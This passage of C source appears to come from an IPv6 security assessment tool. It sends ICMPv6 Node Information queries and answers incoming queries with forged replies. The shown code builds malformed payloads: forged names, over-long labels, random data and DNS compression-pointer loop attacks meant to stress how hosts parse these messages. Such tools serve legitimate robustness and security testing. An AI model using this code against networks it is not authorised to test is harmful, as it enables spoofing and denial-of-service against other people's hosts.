		if(pcap_compile(idata.pfd, &pcap_filter, PCAP_ICMPV6_NI_REPLY, PCAP_OPT, PCAP_NETMASK_UNKNOWN) == -1){
			printf("pcap_compile(): %s", pcap_geterr(idata.pfd));
			exit(EXIT_FAILURE);
		}

		if(pcap_setfilter(idata.pfd, &pcap_filter) == -1){
			printf("pcap_setfilter(): %s", pcap_geterr(idata.pfd));
			exit(EXIT_FAILURE);
		}

		pcap_freecode(&pcap_filter);

		type= ICMP6_NI_QUERY;

		if(idata.verbose_f){
			print_attack_info(&idata);
		}

		while(1){
			curtime=time(NULL);

			if(!loop_f && (curtime - start) >= QUERY_TIMEOUT){
				break;
			}

			if((curtime - lastni) >= nsleep){
				lastni=curtime;

				puts("Sending ICMPv6 Node Information Query....\n");

				if(send_packet(&idata, NULL, NULL) == -1){
					puts("Error sending packet");
					exit(EXIT_FAILURE);
				}
			}

			rset= sset;
			timeout.tv_usec=0;
			timeout.tv_sec= nsleep;

			if((sel=select(idata.fd+1, &rset, NULL, NULL, &timeout)) == -1){
				if(errno == EINTR){
					continue;
				}
				else{
					puts("Error in select()");
					exit(EXIT_FAILURE);
				}
			}

			/* Read a NI Reply packet */
			if(FD_ISSET(idata.fd, &rset)){
				if((r=pcap_next_ex(idata.pfd, &pkthdr, &pktdata)) == -1){
					printf("pcap_next_ex(): %s", pcap_geterr(idata.pfd));
					exit(EXIT_FAILURE);
				}
				else if(r == 0){
					continue; /* Should never happen */
				}

				if(print_ni_data(&idata, pktdata, pkthdr) == -1){
					puts("Error while printing NI data");
					exit(EXIT_FAILURE);
				}
			}
		}
		
		exit(EXIT_SUCCESS);
	}

	if(listen_f){
		if(named_f || fnamed_f || exceedpd_f || dloopattack_f){
			qtype= NI_QTYPE_DNSNAME;
		}
		else if(ipv4addrd_f){
			qtype= NI_QTYPE_IPV4ADDR;
		}
		else if(ipv6addrd_f){
			qtype= NI_QTYPE_NODEADDR;
		}
		else if(!qtype_f){
			qtype= NI_QTYPE_NOOP;
		}

		if(pcap_compile(idata.pfd, &pcap_filter, PCAP_ICMPV6_NI_QUERY, PCAP_OPT, PCAP_NETMASK_UNKNOWN) == -1){
			printf("pcap_compile(): %s", pcap_geterr(idata.pfd));
			exit(EXIT_FAILURE);
		}

    
		if(pcap_setfilter(idata.pfd, &pcap_filter) == -1){
			printf("pcap_setfilter(): %s", pcap_geterr(idata.pfd));
			exit(EXIT_FAILURE);
		}

		pcap_freecode(&pcap_filter);

		type= ICMP6_NI_REPLY;

		if(idata.verbose_f){
			print_attack_info(&idata);
		}

		if(idata.verbose_f){
			print_filters(&idata, &filters);
			puts("Listening to incoming IPv6 packets...");
		}

		while(listen_f){
			rset= sset;

			if((sel=select(idata.fd+1, &rset, NULL, NULL, NULL)) == -1){
				if(errno == EINTR){
					continue;
				}
				else{
					puts("Error in select()");
					exit(EXIT_FAILURE);
				}
			}

			/* Read a Neighbor Solicitation message */
			if((r=pcap_next_ex(idata.pfd, &pkthdr, &pktdata)) == -1){
				printf("pcap_next_ex(): %s", pcap_geterr(idata.pfd));
				exit(EXIT_FAILURE);
			}
			else if(r == 0){
				continue; /* Should never happen */
			}

			pkt_ether = (struct ether_header *) pktdata;
			pkt_ipv6 = (struct ip6_hdr *)((char *) pkt_ether + idata.linkhsize);
			pkt_ni= (struct icmp6_nodeinfo *) ( (unsigned char *) pkt_ipv6 + sizeof(struct ip6_hdr));

			accepted_f=0;

			if(pkt_ni->ni_type != ICMP6_NI_QUERY){
				continue;
			}

			if(pkt_ni->ni_qtype != htons(qtype)){
				continue;
			}

			if(!rand_src_f){
				if(!IN6_IS_ADDR_MC_LINKLOCAL(&(pkt_ipv6->ip6_dst)) && \
					!is_ip6_in_address_list(&(idata.ip6_global), &(pkt_ipv6->ip6_dst)) && \
						!is_eq_in6_addr(&(pkt_ipv6->ip6_dst), &(idata.ip6_local)))
					continue;
			}

			if(filters.nblocklinksrc){
				if(match_ether(filters.blocklinksrc, filters.nblocklinksrc, &(pkt_ether->src))){
					if(idata.verbose_f > 1)
						print_filter_result(&idata, pktdata, BLOCKED);
		
					continue;
				}
			}

			if(filters.nblocklinkdst){
				if(match_ether(filters.blocklinkdst, filters.nblocklinkdst, &(pkt_ether->dst))){
					if(idata.verbose_f > 1)
						print_filter_result(&idata, pktdata, BLOCKED);
		
					continue;
				}
			}
	
			if(filters.nblocksrc){
				if(match_ipv6(filters.blocksrc, filters.blocksrclen, filters.nblocksrc, &(pkt_ipv6->ip6_src))){
					if(idata.verbose_f > 1)
						print_filter_result(&idata, pktdata, BLOCKED);
		
					continue;
				}
			}
	
			if(filters.nblockdst){
				if(match_ipv6(filters.blockdst, filters.blockdstlen, filters.nblockdst, &(pkt_ipv6->ip6_dst))){
					if(idata.verbose_f > 1)
						print_filter_result(&idata, pktdata, BLOCKED);
		
					continue;
				}
			}
	
			if(filters.nacceptlinksrc){
				if(match_ether(filters.acceptlinksrc, filters.nacceptlinksrc, &(pkt_ether->src)))
					accepted_f=1;
			}

			if(filters.nacceptlinkdst && !accepted_f){
				if(match_ether(filters.acceptlinkdst, filters.nacceptlinkdst, &(pkt_ether->dst)))
					accepted_f= 1;
			}

			if(filters.nacceptsrc && !accepted_f){
				if(match_ipv6(filters.acceptsrc, filters.acceptsrclen, filters.nacceptsrc, &(pkt_ipv6->ip6_src)))
					accepted_f= 1;
			}

			if(filters.nacceptdst && !accepted_f){
				if(match_ipv6(filters.acceptdst, filters.acceptdstlen, filters.nacceptdst, &(pkt_ipv6->ip6_dst)))
					accepted_f=1;
			}
	
			if(filters.acceptfilters_f && !accepted_f){
				if(idata.verbose_f > 1)
					print_filter_result(&idata, pktdata, BLOCKED);

				continue;
			}

			if(idata.verbose_f)
				print_filter_result(&idata, pktdata, ACCEPTED);

			/* Send a Neighbor Advertisement */
			send_packet(&idata, pktdata, pkthdr);
		}
    
		exit(EXIT_SUCCESS);
	}
    

	if(!idata.dstaddr_f && !listen_f){
		puts("Error: Nothing to send! (key parameters left unspecified, and not using listening mode)");
		exit(EXIT_FAILURE);
	}

	exit(EXIT_SUCCESS);
}

/*
 * Function: print_ni_data()
 *
 * Wrapper to call the different functions that print the contents of NI replies
 */

int	print_ni_data(struct iface_data *idata, const u_char *pktdata, struct pcap_pkthdr * pkthdr){
	struct icmp6_nodeinfo	*pkt_ni;

	pkt_ni= (struct icmp6_nodeinfo *) ((char *)pktdata + idata->linkhsize + sizeof(struct ip6_hdr));

	switch(ntohs(pkt_ni->ni_qtype)){
		case NI_QTYPE_NOOP:
			if(print_ni_noop(idata, pktdata, pkthdr) == -1){
				return(-1);
			}
			break;

		case NI_QTYPE_SUPTYPES:
			if(print_ni_noop(idata, pktdata, pkthdr) == -1){
				return(-1);
			}
			break;

		case NI_QTYPE_DNSNAME:
			if(print_ni_name(idata, pktdata, pkthdr) == -1){
				return(-1);
			}
			break;

		case NI_QTYPE_NODEADDR:
			if(print_ni_addr6(idata, pktdata, pkthdr) == -1){
				return(-1);
			}
			break;

		case NI_QTYPE_IPV4ADDR:
			if(print_ni_addr6(idata, pktdata, pkthdr) == -1){
				return(-1);
			}
			break;

		default:
			break;
	}

	return(0);
}


/*
 * Function: print_ni_addr()
 *
 * Print responses to ICMPv6 NI queries for IPv4 addresses
 */

int	print_ni_addr(struct iface_data *idata, const u_char *pktdata, struct pcap_pkthdr * pkthdr){
	struct ether_header 	*pkt_ether;
	struct ip6_hdr 			*pkt_ipv6;
	struct icmp6_nodeinfo	*pkt_ni;
	unsigned char			*pkt_end;
	u_int16_t				flags;
	struct ni_reply_ip		*pkt_nidata;

	pkt_ether = (struct ether_header *) pktdata;
	pkt_ipv6 = (struct ip6_hdr *)((char *) pkt_ether + idata->linkhsize);
	pkt_ni= (struct icmp6_nodeinfo *) ((char *) pkt_ipv6 + sizeof(struct ip6_hdr));
	pkt_end = (unsigned char *) pktdata + pkthdr->caplen;

	if( pkt_end > ((unsigned char *)pkt_ni + pkt_ipv6->ip6_plen) )
		pkt_end = (unsigned char *)pkt_ni + pkt_ipv6->ip6_plen;

	if(!is_eq_in6_addr(&(pkt_ipv6->ip6_dst), &(idata->srcaddr)))
		return 0;

	if(inet_ntop(AF_INET6, &(pkt_ipv6->ip6_src), pv6addr, sizeof(pv6addr)) == NULL){
		if(idata->verbose_f)
			puts("inet_ntop(): Error converting IPv6 Source Address to presentation format");

		return(-1);
	}

	printf("Response from: %s\n", pv6addr);

	switch(pkt_ni->ni_code){
		case 0:
			printf("\tCode: 0 (Successful reply)");
			break;

		case 1:
			printf("\tCode: 1 (Node refuses to supply the answer)");
			break;

		case 2:
			printf("\tCode: 2 (Qtype unknown to the responder)");
			break;

		default:
			printf("\tCode: %u (Qtype unknown)", pkt_ni->ni_code);
			break;
	}

	flags= ntohs(pkt_ni->ni_flags);
	printf("\tFlags: %s%s%s%s%s%s%s\n", ((flags & NI_NODEADDR_FLAG_GLOBAL)?"G":""), \
										((flags & NI_NODEADDR_FLAG_SITELOCAL)?"S":""), \
										((flags & NI_NODEADDR_FLAG_LINKLOCAL)?"L":""), \
										((flags & NI_NODEADDR_FLAG_COMPAT)?"C":""),\
										((flags & NI_NODEADDR_FLAG_ALL)?"A":""), \
										((flags & NI_NODEADDR_FLAG_TRUNCATE)?"T":""),\
										((!flags)?"none":""));

	pkt_nidata= (struct ni_reply_ip *) ((char *)pkt_ni + sizeof(struct icmp6_nodeinfo));

	while( (pkt_end - (unsigned char *) pkt_nidata) >= sizeof(struct ni_reply_ip)){
		if(inet_ntop(AF_INET, &(pkt_nidata->ip), pv6addr, sizeof(pv6addr)) == NULL){
			if(idata->verbose_f)
				puts("inet_ntop(): Error converting IPv4 Address to presentation format");

			return(-1);
		}

		printf("\t%s (TTL: %lu%s)\n", pv6addr, (LUI) pkt_nidata->ni_ip_ttl,\
				(pkt_nidata->ni_ip_ttl==0xffffffff)?" (infinity)":"");

		pkt_nidata++;
	}

	if( (unsigned char *)pkt_nidata != pkt_end){
		puts("Incomplete data in received NI Reply\n");
	}
	else{
		puts("");
	}

	return(0);
}


/*
 * Function: print_ni_noop()
 *
 * Print responses to NOOP ICMPv6 NI queries
 */

int	print_ni_noop(struct iface_data *idata, const u_char *pktdata, struct pcap_pkthdr * pkthdr){
	struct ether_header 	*pkt_ether;
	struct ip6_hdr 			*pkt_ipv6;
	struct icmp6_nodeinfo	*pkt_ni;
	unsigned char			*pkt_end;

	pkt_ether = (struct ether_header *) pktdata;
	pkt_ipv6 = (struct ip6_hdr *)((char *) pkt_ether + idata->linkhsize);
	pkt_ni= (struct icmp6_nodeinfo *) ((char *) pkt_ipv6 + sizeof(struct ip6_hdr));
	pkt_end = (unsigned char *) pktdata + pkthdr->caplen;

	if( pkt_end > ((unsigned char *)pkt_ni + pkt_ipv6->ip6_plen) )
		pkt_end = (unsigned char *)pkt_ni + pkt_ipv6->ip6_plen;

	if(!is_eq_in6_addr(&(pkt_ipv6->ip6_dst), &(idata->srcaddr)))
		return 0;

	if(inet_ntop(AF_INET6, &(pkt_ipv6->ip6_src), pv6addr, sizeof(pv6addr)) == NULL){
		if(idata->verbose_f)
			puts("inet_ntop(): Error converting IPv6 Source Address to presentation format");

		return(-1);
	}

	printf("Response from: %s\n", pv6addr);

	switch(pkt_ni->ni_code){
		case 0:
			puts("\tCode: 0 (Successful reply)\n");
			break;

		case 1:
			puts("\tCode: 1 (Node refuses to supply the answer)\n");
			break;

		case 2:
			puts("\tCode: 2 (Qtype unknown to the responder)\n");
			break;

		default:
			printf("\tCode: %u (Qtype unknown)\n\n", pkt_ni->ni_code);
			break;
	}

	return(0);
}


/*
 * Function: print_ni_addr6()
 *
 * Print responses to ICMPv6 NI queries for IPv6 addresses
 */

int	print_ni_addr6(struct iface_data *idata, const u_char *pktdata, struct pcap_pkthdr * pkthdr){
	struct ether_header 	*pkt_ether;
	struct ip6_hdr 			*pkt_ipv6;
	struct icmp6_nodeinfo	*pkt_ni;
	unsigned char			*pkt_end;
	u_int16_t				flags;
	struct ni_reply_ip6     *pkt_nidata;

	pkt_ether = (struct ether_header *) pktdata;
	pkt_ipv6 = (struct ip6_hdr *)((char *) pkt_ether + idata->linkhsize);
	pkt_ni= (struct icmp6_nodeinfo *) ((char *) pkt_ipv6 + sizeof(struct ip6_hdr));
	pkt_end = (unsigned char *) pktdata + pkthdr->caplen;

	if( pkt_end > ((unsigned char *)pkt_ni + pkt_ipv6->ip6_plen) )
		pkt_end = (unsigned char *)pkt_ni + pkt_ipv6->ip6_plen;

	if(!is_eq_in6_addr(&(pkt_ipv6->ip6_dst), &(idata->srcaddr)))
		return 0;

	if(inet_ntop(AF_INET6, &(pkt_ipv6->ip6_src), pv6addr, sizeof(pv6addr)) == NULL){
		if(idata->verbose_f)
			puts("inet_ntop(): Error converting IPv6 Address to presentation format");

		return(-1);
	}

	printf("Response from: %s\n", pv6addr);

	switch(pkt_ni->ni_code){
		case 0:
			printf("\tCode: 0 (Successful reply)");
			break;

		case 1:
			printf("\tCode: 1 (Node refuses to supply the answer)");
			break;

		case 2:
			printf("\tCode: 2 (Qtype unknown to the responder)");
			break;

		default:
			printf("\tCode: %u (Qtype unknown)", pkt_ni->ni_code);
			break;
	}

	flags= ntohs(pkt_ni->ni_flags);
	printf("\tFlags: %s%s%s%s%s%s%s\n", ((flags & NI_NODEADDR_FLAG_GLOBAL)?"G":""), \
										((flags & NI_NODEADDR_FLAG_SITELOCAL)?"S":""), \
										((flags & NI_NODEADDR_FLAG_LINKLOCAL)?"L":""), \
										((flags & NI_NODEADDR_FLAG_COMPAT)?"C":""),\
										((flags & NI_NODEADDR_FLAG_ALL)?"A":""), \
										((flags & NI_NODEADDR_FLAG_TRUNCATE)?"T":""),\
										((!flags)?"none":""));

	pkt_nidata= (struct ni_reply_ip6 *) ((char *)pkt_ni + sizeof(struct icmp6_nodeinfo));

	while( (pkt_end - (unsigned char *) pkt_nidata) >= sizeof(struct ni_reply_ip6)){
		if(inet_ntop(AF_INET6, &(pkt_nidata->ip6), pv6addr, sizeof(pv6addr)) == NULL){
			if(idata->verbose_f)
				puts("inet_ntop(): Error converting IPv6 Source Address to presentation format");

			return(-1);
		}

		printf("\t%s (TTL: %lu%s)\n", pv6addr, (LUI) pkt_nidata->ni_ip6_ttl,\
				(pkt_nidata->ni_ip6_ttl==0xffffffff)?" (infinity)":"");

		pkt_nidata++;
	}

	if( (unsigned char *)pkt_nidata != pkt_end){
		puts("Incomplete data in received NI Reply\n");
	}
	else{
		puts("");
	}

	return(0);
}



/*
 * Function: print_ni_name()
 *
 * Print responses to ICMPv6 NI queries for names
 */

int	print_ni_name(struct iface_data *idata, const u_char *pktdata, struct pcap_pkthdr * pkthdr){
	struct ether_header 	*pkt_ether;
	struct ip6_hdr 			*pkt_ipv6;
	struct icmp6_nodeinfo	*pkt_ni;
	unsigned char			*pkt_end;
	struct ni_reply_name	*pkt_nidata;
	unsigned char			*start, *next;

	pkt_ether = (struct ether_header *) pktdata;
	pkt_ipv6 = (struct ip6_hdr *)((char *) pkt_ether + idata->linkhsize);
	pkt_ni= (struct icmp6_nodeinfo *) ((char *) pkt_ipv6 + sizeof(struct ip6_hdr));
	pkt_end = (unsigned char *) pktdata + pkthdr->caplen;

	if( pkt_end > ((unsigned char *)pkt_ni + pkt_ipv6->ip6_plen) )
		pkt_end = (unsigned char *)pkt_ni + pkt_ipv6->ip6_plen;

	if(!is_eq_in6_addr(&(pkt_ipv6->ip6_dst), &(idata->srcaddr)))
		return 0;

	if(inet_ntop(AF_INET6, &(pkt_ipv6->ip6_src), pv6addr, sizeof(pv6addr)) == NULL){
		if(idata->verbose_f)
			puts("inet_ntop(): Error converting IPv6 Address to presentation format");

		return(-1);
	}

	printf("Response from: %s\n", pv6addr);

	switch(pkt_ni->ni_code){
		case 0:
			puts("\tCode: 0 (Successful reply)");
			break;

		case 1:
			puts("\tCode: 1 (Node refuses to supply the answer)");
			break;

		case 2:
			puts("\tCode: 2 (Qtype unknown to the responder)");
			break;

		default:
			printf("\tCode: %u (Qtype unknown)\n", pkt_ni->ni_code);
			break;
	}

	pkt_nidata= (struct ni_reply_name *) ((char *)pkt_ni + sizeof(struct icmp6_nodeinfo));
	start= (unsigned char *) pkt_nidata;
	next= (unsigned char *) &(pkt_nidata->ni_name_name);

	while(next != NULL && dns_decode(start, pkt_end-start, next, domain, sizeof(domain), &next) == 0){
		printf("\t%s (TTL: %lu%s)\n", domain, (LUI) pkt_nidata->ni_name_ttl,\
				(pkt_nidata->ni_name_ttl==0xffffffff)?" (infinity)":"");
	}

	puts("");

	return(0);
}


/*
 * Function: init_packet_data()
 *
 * Initialize the contents of the attack packet (Ethernet header, IPv6 Header, and ICMPv6 header)
 * that are expected to remain constant for the specified attack.
 */

void init_packet_data(struct iface_data *idata){
	struct dlt_null *dlt_null;
	ethernet= (struct ether_header *) buffer;
	dlt_null= (struct dlt_null *) buffer;
	v6buffer = buffer + idata->linkhsize;
	ipv6 = (struct ip6_hdr *) v6buffer;

	if(idata->type == DLT_EN10MB && idata->type != IFACE_LOOPBACK){
		ethernet->src = idata->hsrcaddr;
		ethernet->dst = idata->hdstaddr;
		ethernet->ether_type = htons(ETHERTYPE_IPV6);
	}
	else if(idata->type == DLT_NULL){
		dlt_null->family= PF_INET6;
	}

	ipv6->ip6_flow=0;
	ipv6->ip6_vfc= 0x60;
	ipv6->ip6_hlim= hoplimit;
	ipv6->ip6_src= idata->srcaddr;

	ipv6->ip6_dst= idata->dstaddr;
	prev_nh = (unsigned char *) &(ipv6->ip6_nxt);
	ptr = (unsigned char *) v6buffer + MIN_IPV6_HLEN;
    
	if(hbhopthdr_f){
		hbhopthdrs=0;
	
		while(hbhopthdrs < nhbhopthdr){
			if((ptr+ hbhopthdrlen[hbhopthdrs]) > (v6buffer+ ETH_DATA_LEN)){
				puts("Packet too large while processing HBH Opt. Header");
				exit(EXIT_FAILURE);
			}
	    
			*prev_nh = IPPROTO_HOPOPTS;
			prev_nh = ptr;
			memcpy(ptr, hbhopthdr[hbhopthdrs], hbhopthdrlen[hbhopthdrs]);
			ptr = ptr + hbhopthdrlen[hbhopthdrs];
			hbhopthdrs++;
		}
	}

	if(dstoptuhdr_f){
		dstoptuhdrs=0;
	
		while(dstoptuhdrs < ndstoptuhdr){
			if((ptr+ dstoptuhdrlen[dstoptuhdrs]) > (v6buffer+ ETH_DATA_LEN)){
				puts("Packet too large while processing Dest. Opt. Header (Unfrag. Part)");
				exit(EXIT_FAILURE);
			}

			*prev_nh = IPPROTO_DSTOPTS;
			prev_nh = ptr;
			memcpy(ptr, dstoptuhdr[dstoptuhdrs], dstoptuhdrlen[dstoptuhdrs]);
			ptr = ptr + dstoptuhdrlen[dstoptuhdrs];
			dstoptuhdrs++;
		}
	}

	/* Everything that follows is the Fragmentable Part of the packet */
	fragpart = ptr;

	if(fragh_f){
		/* Check that we are able to send the Unfragmentable Part, together with a 
		   Fragment Header and a chunk data over our link layer
		 */
		if( (fragpart+sizeof(fraghdr)+nfrags) > (v6buffer+ETH_DATA_LEN)){
			puts("Unfragmentable part too large for current MTU (1500 bytes)");
			exit(EXIT_FAILURE);
		}

		/* We prepare a separate Fragment Header, but we do not include it in the packet to be sent.
		   This Fragment Header will be used (an assembled with the rest of the packet by the 
		   send_packet() function.
		*/
		bzero(&fraghdr, FRAG_HDR_SIZE);
		*prev_nh = IPPROTO_FRAGMENT;
		prev_nh = (unsigned char *) &fraghdr;
	}

	if(dstopthdr_f){
		dstopthdrs=0;
	
		while(dstopthdrs < ndstopthdr){
			if((ptr+ dstopthdrlen[dstopthdrs]) > (v6buffer+ idata->max_packet_size)){
			puts("Packet too large while processing Dest. Opt. Header (should be using the Frag. option?)");
			exit(EXIT_FAILURE);
			}
    
			*prev_nh = IPPROTO_DSTOPTS;
			prev_nh = ptr;
			memcpy(ptr, dstopthdr[dstopthdrs], dstopthdrlen[dstopthdrs]);
			ptr = ptr + dstopthdrlen[dstopthdrs];
			dstopthdrs++;
		}
	}


	*prev_nh = IPPROTO_ICMPV6;
	startofprefixes=ptr;
}



/*
 * Function: send_packet()
 *
 * Initialize the remaining fields of the Neighbor Advertisement Message, and
 * send the attack packet(s).
 */
int send_packet(struct iface_data *idata, const u_char *pktdata, struct pcap_pkthdr * pkthdr){
	ptr=startofprefixes;

	if(pktdata != NULL){   /* Sending a NI Reply in response to a received query */
		pkt_ether = (struct ether_header *) pktdata;
		pkt_ipv6 = (struct ip6_hdr *)((char *) pkt_ether + idata->linkhsize);
		pkt_ni= (struct icmp6_nodeinfo *) ( (unsigned char *)pkt_ipv6 + sizeof (struct ip6_hdr));
	
		/* If the IPv6 Source Address of the incoming Neighbor Solicitation is the unspecified 
		   address (::), the Neighbor Advertisement must be directed to the IPv6 all-nodes 
		   multicast address (and the Ethernet Destination address should be 33:33:33:00:00:01). 
		   Otherwise, the Neighbor Advertisement is sent to the IPv6 Source Address (and 
		   Ethernet Source Address) of the incoming Neighbor Solicitation message
		 */
		pkt_ipv6addr = &(pkt_ipv6->ip6_src);

		/*
		   We don't send any packets if the Source Address of the captured packet is the unspecified
		   address.
		 */
		if(IN6_IS_ADDR_UNSPECIFIED(pkt_ipv6addr)){
			return 0;
		}
		else{
			ipv6->ip6_dst = pkt_ipv6->ip6_src;
			ethernet->dst = pkt_ether->src;
		}

		pkt_ipv6addr = &(pkt_ipv6->ip6_dst);

		/*
		   If the query was sent to a multicast address, we respond with a forged link-local address.
		   Otherwise we respond to the unicast address that elicited our response

		    XXX: [fgont] Changed
		 */
		if(IN6_IS_ADDR_MULTICAST(pkt_ipv6addr)){
			ipv6->ip6_src= idata->srcaddr;
			ethernet->src= idata->hsrcaddr;
		}
		else{
			ipv6->ip6_src= pkt_ipv6->ip6_dst;
			ethernet->src= pkt_ether->dst;
		}

		ni= (struct icmp6_nodeinfo *) ptr;
		ni->ni_type= ICMP6_NI_REPLY;
		ni->ni_code= 0;
		ni->ni_qtype= pkt_ni->ni_qtype;
		ni->ni_flags= pkt_ni->ni_flags;

		for(i=0; i<8; i++)
			ni->icmp6_ni_nonce[i]= pkt_ni->icmp6_ni_nonce[i];

		ptr= ptr + sizeof(struct icmp6_nodeinfo);

		switch(ntohs(pkt_ni->ni_qtype)){
			case NI_QTYPE_NOOP:
				break;

			case NI_QTYPE_SUPTYPES:
				break;

			case NI_QTYPE_DNSNAME:
				if(dloopattack_f){
					if((ptr+(dlsize+4)) > (v6buffer + idata->max_packet_size)){
						if(idata->verbose_f)
							puts("Packet too large while inserting name payload");

							return(-1);
					}

					bzero(ptr, 4);
					ptr+=4;
					bcopy(dlpointer, ptr, dlsize);
					ptr+= dlsize;
				}
				else if(named_f){
					if((ptr+ (namedlen+4)) > (v6buffer + idata->max_packet_size)){
						if(idata->verbose_f)
							puts("Packet too large while inserting name");

							return(-1);
					}

					/* The response contains a TTL, and it is set to 0 */
					bzero(ptr, 4);
					ptr+= 4;

					bcopy(named, ptr, namedlen);
					ptr+= namedlen;

					if(snamedslabel_f){
						if((ptr+1) > (v6buffer + idata->max_packet_size)){
							if(idata->verbose_f)
								puts("Error while inserting last label");

							return(-1);
						}
						else{
							*ptr=0;
							ptr++;
						}
					}
				}
				else if(fnamed_f && fnamedlen>0){

					if((ptr+ (fnamedlen+4)) > (v6buffer + idata->max_packet_size)){
						if(idata->verbose_f)
							puts("Packet too large when inserting forged name");

							return(-1);
					}

					/* The response contains a TTL, and it is set to 0 */
					bzero(ptr, 4);
					ptr+= 4;
		
					i=fnamedlen-1; /* There is a zero-length label at the end */

					if(snamedslabel_f && i>0)
						i=i-1;

					while(i>0){
						if(i<= (maxlabel+1)){
							/* This accounts for the length byte */
							i=i-1;
							*ptr=i;
							ptr++;

							for(j=0; j<i; j++){
								*ptr='a';
								ptr++;
							}

							i= 0;
						}
						else{
							*ptr= maxlabel;
							ptr++;

							for(j=0; j<maxlabel; j++){
								*ptr='a';
								ptr++;
							}
					
							/* This accounts for the 'lenght' byte, too */
							i=i-(maxlabel+1);
						}
					}

					*ptr=0;
					ptr++;

					if(snamedslabel_f && fnamedlen>1){
						if((ptr+1) > (v6buffer + idata->max_packet_size)){
							return(-1);
						}
						else{
							*ptr=0;
							ptr++;
						}
					}
				}
				else if(exceedpd_f){
					if( (ptr+5) > (v6buffer + idata->max_packet_size)){
						if(idata->verbose_f)
							puts("Packet too large whil inserting 'exceeding' name");

							return(-1);
					}

					/* The response contains a TTL, and it is set to 0 */
					bzero(ptr, 4);
					ptr+= 4;

					*ptr= exceedpd;
					ptr++;
				}
				else if(payloadsize_f){
					if(payloadsize>=4)
						payloadsize-=4;

					if((ptr+(payloadsize+4)) > (v6buffer + idata->max_packet_size)){
						if(idata->verbose_f)
							puts("Packet too large while inserting randomized payload");

							return(-1);
					}

					/* The response contains a TTL, and it is set to 0 */
					bzero(ptr, 4);
					ptr+= 4;

					for(i=0; i<payloadsize; i++){
						*ptr= (unsigned char) random();
						ptr++;
					}
				}

				break;

			case NI_QTYPE_NODEADDR:
				if(ipv6addrd_f){
					if( (ptr+sizeof(struct in6_addr)) > (v6buffer + idata->max_packet_size)){
						if(idata->verbose_f)
							puts("Packet too large when inserting IPv6 address");

							return(-1);
					}

					*(struct in6_addr *)ptr= ipv6addrd;
					ptr= ptr+ sizeof(struct in6_addr);
				}
				else if(payloadsize_f){
					if((ptr+payloadsize) > (v6buffer + idata->max_packet_size)){
						if(idata->verbose_f)
							puts("Packet too large while inserting randomized payload");

							return(-1);
					}

					for(i=0; i<payloadsize; i++){
						*ptr= (unsigned char) random();
						ptr++;
					}
				}
				break;

			case NI_QTYPE_IPV4ADDR:
				if(ipv4addrd_f){
					if( (ptr+sizeof(struct in_addr)) > (v6buffer + idata->max_packet_size)){
						if(idata->verbose_f)
							puts("Packet too large while inserting IPv4 address");

							return(-1);
					}

					*(struct in_addr *)ptr= ipv4addrd;
					ptr= ptr+ sizeof(struct in_addr);
				}
				else if(payloadsize_f){
					if((ptr+payloadsize) > (v6buffer + idata->max_packet_size)){
						if(idata->verbose_f)
							puts("Packet too large while inserting randomized payload");

							return(-1);
					}

					for(i=0; i<payloadsize; i++){
						*ptr= (unsigned char) random();
						ptr++;
					}
				}
				break;

			default:
				break;
		}
	}
	else{
		/* Packet being sent to a pre-specified destination */

		ni= (struct icmp6_nodeinfo *) ptr;
		ni->ni_type= ICMP6_NI_QUERY;
		ni->ni_code= code;
		ni->ni_qtype= htons(qtype);
		ni->ni_flags= htons(flags);

		for(i=0; i<8; i++)
			ni->icmp6_ni_nonce[i]= random();

		ptr= ptr + sizeof(struct icmp6_nodeinfo);

		if(ipv4addr_f){
			if( (ptr+sizeof(struct in_addr)) > (v6buffer + idata->max_packet_size)){
				if(idata->verbose_f)
					puts("Packet too large while inserting IPv4 address");

					return(-1);
			}

			*(struct in_addr *)ptr= ipv4addr;
			ptr= ptr+ sizeof(struct in_addr);
		}
		else if(ipv6addr_f){
			if( (ptr+sizeof(struct in6_addr)) > (v6buffer + idata->max_packet_size)){
				if(idata->verbose_f)
					puts("Packet too large while inserting IPv6 address");

					return(-1);
			}

			*(struct in6_addr *)ptr= ipv6addr;
			ptr= ptr+ sizeof(struct in6_addr);
		}
		else if(name_f){
			if((ptr+namelen) > (v6buffer + idata->max_packet_size)){
				if(idata->verbose_f)
					puts("Packet too large while inserting name");

					return(-1);
			}

			bcopy(name, ptr, namelen);
			ptr+= namelen;

			if(snameslabel_f){
				if((ptr+1) > (v6buffer + idata->max_packet_size)){
					if(idata->verbose_f)
						puts("Error while inserting last label");

					return(-1);
				}
				else{
					*ptr=0;
					ptr++;
				}
			}
		}
		else if(fname_f && fnamelen>0){

			if((ptr+fnamelen) > (v6buffer + idata->max_packet_size)){
				if(idata->verbose_f)
					puts("Packet too large when inserting forged name");

					return(-1);
			}
		
			i=fnamelen-1; /* There is a zero-length label at the end */

			if(snameslabel_f && i>0)
				i=i-1;

			while(i>0){
				if(i<= (maxlabel+1)){
					/* This accounts for the length byte */
					i=i-1;
					*ptr=i;
					ptr++;

					for(j=0; j<i; j++){
						*ptr='a';
						ptr++;
					}

					i= 0;
				}
				else{
					*ptr= maxlabel;
					ptr++;

					for(j=0; j<maxlabel; j++){
						*ptr='a';
						ptr++;
					}
					
					/* This accounts for the 'lenght' byte, too */
					i=i-(maxlabel+1);
				}
			}

			*ptr=0;
			ptr++;

			if(snameslabel_f && fnamelen>1){
				if((ptr+1) > (v6buffer + idata->max_packet_size)){
					return(-1);
				}
				else{
					*ptr=0;
					ptr++;
				}
			}
		}
		else if(exceedp_f){
			if( (ptr+1) > (v6buffer + idata->max_packet_size)){
				if(idata->verbose_f)
					puts("Packet too large when 'exceeding' name");

					return(-1);
			}

			*ptr= exceedp;
			ptr++;
		}
		else if(payloadsize_f){
			if((ptr+payloadsize) > (v6buffer + idata->max_packet_size)){
				if(idata->verbose_f)
					puts("Packet too large while inserting randomized payload");

					return(-1);
			}

			for(i=0; i<payloadsize; i++){
				*ptr= (unsigned char) random();
				ptr++;
			}
		}
		else if(sloopattack_f){
			if((ptr+(slsize+4)) > (v6buffer + idata->max_packet_size)){
				if(idata->verbose_f)
					puts("Packet too large while inserting name payload");

					return(-1);
			}

			bzero(ptr, 4);
			ptr+=4;
			bcopy(slpointer, ptr, slsize);
			ptr+= slsize;
		}
	}

	ni->ni_cksum = 0;
	ni->ni_cksum = in_chksum(v6buffer, ni, ptr-(unsigned char *)ni, IPPROTO_ICMPV6);

	if(!fragh_f){
		ipv6->ip6_plen = htons((ptr - v6buffer) - MIN_IPV6_HLEN);

		if((nw=pcap_inject(idata->pfd, buffer, ptr - buffer)) == -1){
			printf("pcap_inject(): %s\n", pcap_geterr(idata->pfd));
			exit(EXIT_FAILURE);
		}

		if(nw != (ptr-buffer)){
